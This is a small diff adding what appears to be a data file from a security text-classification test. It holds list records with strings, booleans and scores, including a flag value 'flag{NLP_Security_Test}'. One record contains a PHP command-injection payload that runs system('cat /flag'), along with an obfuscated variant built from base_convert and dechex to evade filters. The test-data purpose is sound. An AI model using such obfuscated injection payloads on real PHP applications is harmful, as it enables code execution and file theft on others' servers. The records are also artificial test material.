@@ -1,0 +1,12 @@
+
+['c', 'c', True]
+[1, 0.21, 0.16, 0.29]
+
+['unknown', '(', False]
+
+['0x5f474554', '5F474554', True]
+[5, 0.4, 0.4, 0.43]
+
+["pi()*0+system('cat /flag')", ['$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag'], False]
+
+['[flag{}]', 'flag{NLP_Security_Test}', False]
